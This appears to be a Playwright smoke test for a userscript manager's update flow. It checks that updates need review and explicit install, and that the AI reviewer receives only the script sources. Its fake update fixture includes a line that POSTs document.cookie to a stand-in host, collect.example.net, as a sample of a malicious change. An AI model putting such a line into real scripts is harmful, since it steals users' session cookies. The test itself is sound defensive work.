// The `updates` smoke flow (npm run smoke:updates): update checks never install anything.
//
// The mock backend serves the "remote" copy of an installed script at /__updates/tidy.user.js (and
// its header at tidy.meta.js), and answers the safety review with a fixed JSON verdict. The flow
// proves, in order: the panel's open-time check finds v1.1.0 and the row and the Mods tab say so
// while the installed source is untouched; a second open inside a day fetches nothing; the review
// screen names the new @connect host; "Check with the agent first" sends the model exactly the two
// sources (no page, no chat) and renders its findings; Skip hides v1.1.0; a newer v1.2.0 comes back
// on the row's own Update button, and only "Install update" installs it.

const V = (version, extra = []) =>
  [
    '// ==UserScript==',
    '// @name         Tidy',
    '// @namespace    https://example.com/tidy',
    `// @version      ${version}`,
    '// @description  Tidies example.com.',
    '// @match        *://*.example.com/*',
    '// @grant        GM_addStyle',
    ...extra,
    '// ==/UserScript==',
    '',
    "GM_addStyle('.ad { display: none !important; }');",
    '',
  ].join('\n');

export async function updatesFlow({ launch, openPanel, openSite, log, controlBase, outDir, capture = false }) {
  const fail = (m) => {
    throw new Error(`updates: ${m}`);
  };
  const urls = [`// @updateURL    ${controlBase}/__updates/tidy.meta.js`, `// @downloadURL  ${controlBase}/__updates/tidy.user.js`];
  const INSTALLED = V('1.0.0', urls);
  const NEXT = V('1.1.0', [...urls.slice(0), '// @grant        GM_xmlhttpRequest', '// @connect      collect.example.net']).replace(
    "GM_addStyle('.ad { display: none !important; }');",
    "GM_addStyle('.ad { display: none !important; }');\nGM_xmlhttpRequest({ method: 'POST', url: 'https://collect.example.net/c', data: document.cookie });",
  );
  const serve = (source) => fetch(`${controlBase}/__updates`, { method: 'POST', body: JSON.stringify({ source }) });
  const fetches = async () => (await (await fetch(`${controlBase}/__updates`)).json()).fetches;
  await serve(NEXT);
  await fetch(`${controlBase}/__requests`, { method: 'DELETE' });

  const now = Date.now();
  const mod = {
    id: 'tidy-mod',
    name: 'Tidy',
    description: 'Tidies example.com.',
    version: '1.0.0',
    matches: ['*://*.example.com/*'],
    excludeMatches: [],
    includeGlobs: [],
    excludeGlobs: [],
    runAt: 'document_idle',
    world: 'USER_SCRIPT',
    allFrames: true,
    grants: ['GM_addStyle'],
    connect: [],
    requires: [],
    resources: [],
    downloadUrl: `${controlBase}/__updates/tidy.user.js`,
    source: INSTALLED,
    enabled: true,
    createdAt: now,
    updatedAt: now,
  };

  const b = await launch('light');
  try {
    await b.ctx.route('https://page.example/**', (r) => r.fulfill({ status: 200, contentType: 'text/html', body: '<!doctype html><title>SECRET PAGE TITLE</title><p>Private page text that must never reach the reviewer.</p>' }));
    const panel = await openPanel(b.ctx, b.extId, { storage: { mods: [mod] } });
    await openSite(b.ctx, 'https://page.example/');
    const stored = async () => (await panel.evaluate(async () => (await chrome.storage.local.get('mods')).mods ?? []))[0];

    // 1. Opening the panel checks, and offers; the installed mod is untouched.
    await panel.locator('.tab-group [data-view="mods"] [data-testid="mods-update-badge"]', { hasText: '1' }).waitFor({ timeout: 20_000 });
    await panel.locator('.tab-group [data-view="mods"]').click();
    const offer = panel.locator('[data-testid="mod-update-available"]');
    await offer.waitFor({ timeout: 10_000 });
    if (!(await offer.textContent())?.includes('Update available v1.1.0')) fail(`row reads ${await offer.textContent()}`);
    let m = await stored();
    if (m.version !== '1.0.0' || m.source !== INSTALLED) fail('a check changed the installed mod');
    // It went to the header-only .meta.js first, then the full script.
    const firstFetches = await fetches();
    if (firstFetches !== 2) fail(`expected meta + script fetches, got ${firstFetches}`);

    // 2. Opening again within the day fetches nothing.
    await panel.reload();
    await panel.locator('.tab-group [data-view="mods"] [data-testid="mods-update-badge"]').waitFor({ timeout: 10_000 });
    await panel.waitForTimeout(800);
    if ((await fetches()) !== firstFetches) fail('a second open inside a day fetched again');
    await panel.locator('.tab-group [data-view="mods"]').click();

    // 3. The review screen: the new host, before any code.
    const [review] = await Promise.all([b.ctx.waitForEvent('page', { timeout: 10_000 }), panel.locator('[data-testid="mod-update-available"] button').click()]);
    await review.waitForLoadState('domcontentloaded');
    if (!review.url().includes('install.html?update=tidy-mod')) fail(`review opened ${review.url()}`);
    const powers = review.locator('[data-testid="update-powers"]');
    await powers.waitFor({ timeout: 10_000 });
    const powersText = await powers.textContent();
    if (!powersText?.includes('May now send requests to collect.example.net (@connect).')) fail(`powers read ${powersText}`);
    if (!powersText.includes('can make requests to other sites (GM_xmlhttpRequest)')) fail('the new grant is not named');
    if (!(await review.locator('[data-testid="update-versions"]').textContent())?.includes('v1.0.0 → v1.1.0')) fail('versions not shown');
    if (!(await review.locator('[data-testid="update-diff"]').textContent())?.includes('+GM_xmlhttpRequest')) fail('the diff does not show the added line');

    // 4. Check with the agent first: only the two sources go to the model.
    await review.locator('[data-testid="update-ask-agent"]').click();
    const verdict = review.locator('[data-testid="update-verdict"]');
    await verdict.waitFor({ timeout: 20_000 });
    if ((await verdict.textContent())?.trim() !== 'review carefully') fail(`verdict ${await verdict.textContent()}`);
    if (!(await review.locator('[data-testid="update-findings"]').textContent())?.includes('collect.example.net')) fail('findings not rendered');
    const reqs = (await (await fetch(`${controlBase}/__requests`)).json()).requests.filter((r) => r.script === 'review');
    if (reqs.length !== 1) fail(`${reqs.length} review requests`);
    const sent = reqs[0].messages;
    if (sent.length !== 2 || sent[0].role !== 'system' || sent[1].role !== 'user') fail(`the review sent ${sent.map((x) => x.role).join(',')}`);
    const userText = typeof sent[1].content === 'string' ? sent[1].content : sent[1].content.map((p) => p.text ?? '').join('');
    if (!userText.includes('@version      1.0.0') || !userText.includes('@version      1.1.0')) fail('the review did not carry both versions');
    if (/SECRET PAGE TITLE|Private page text|page\.example|\[Current page/.test(JSON.stringify(sent))) fail('page content reached the reviewer');
    if (reqs[0].hasImages) fail('the review carried an image');
    if (capture) {
      await review.setViewportSize({ width: 860, height: 1100 });
      await review.waitForTimeout(300);
      await review.screenshot({ path: `${outDir}/17-update-review.png` });
      log('17-update-review.png');
    }
    m = await stored();
    if (m.version !== '1.0.0') fail('asking the agent installed something');

    // 5. Skip this version: gone from the row and the tab, and nothing installed.
    await review.locator('[data-testid="update-skip"]').click();
    await review.locator('[data-testid="update-done"]', { hasText: 'Skipped v1.1.0' }).waitFor({ timeout: 10_000 });
    await review.close();
    await offer.waitFor({ state: 'detached', timeout: 10_000 });
    if (await panel.locator('[data-testid="mods-update-badge"]').count()) fail('the badge outlived the skip');
    if ((await stored()).version !== '1.0.0') fail('skip installed something');

    // 6. A newer version is offered again — here through the row's own Update (a check, not an
    //    install) — and only "Install update" installs it.
    await serve(NEXT.replace('1.1.0', '1.2.0'));
    const card = panel.locator('.card', { has: panel.locator('h4', { hasText: 'Tidy' }) }).first();
    const [review2] = await Promise.all([b.ctx.waitForEvent('page', { timeout: 15_000 }), card.locator('button', { hasText: /^Update$/ }).click()]);
    await review2.locator('[data-testid="update-versions"]', { hasText: 'v1.0.0 → v1.2.0' }).waitFor({ timeout: 10_000 });
    if ((await stored()).version !== '1.0.0') fail('the Update button installed without review');
    // No cached review for a different version: the agent is asked afresh only if the user asks.
    if (await review2.locator('[data-testid="update-verdict"]').count()) fail('a review of 1.1.0 was shown for 1.2.0');
    await review2.locator('[data-testid="update-install"]').click();
    await review2.locator('[data-testid="update-done"]', { hasText: 'updated to v1.2.0' }).waitFor({ timeout: 15_000 });
    m = await stored();
    if (m.version !== '1.2.0' || !m.source.includes('collect.example.net') || m.id !== 'tidy-mod') fail(`after install: ${m.version} ${m.id}`);
    await review2.close();

    // 7. The setting exists and is on by default; there is no auto-install option at all.
    await panel.locator('.tabs button[data-view="settings"], .tabs [aria-label="Settings"]').first().click();
    const toggle = panel.locator('[data-testid="setting-check-updates"]');
    await toggle.waitFor({ timeout: 5000 });
    if (!(await toggle.isChecked())) fail('update checks are not on by default');
    if (await panel.getByText(/install updates automatically|auto-?install/i).count()) fail('an auto-install option exists');
    log('updates flow OK');
  } finally {
    await b.close();
  }
}
